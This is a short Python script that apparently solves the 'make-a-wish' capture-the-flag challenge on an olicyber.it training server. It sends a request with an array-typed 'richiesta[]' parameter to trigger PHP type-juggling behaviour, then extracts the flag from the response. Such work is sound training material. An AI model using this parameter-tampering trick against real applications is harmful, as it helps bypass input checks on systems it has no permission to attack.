import requests

url = 'http://make-a-wish.challs.olicyber.it/'
resp = requests.get(url + '?richiesta[]=')
flag = resp.text[resp.text.find('flag{') : ]
print(flag[:flag.find('}') + 1])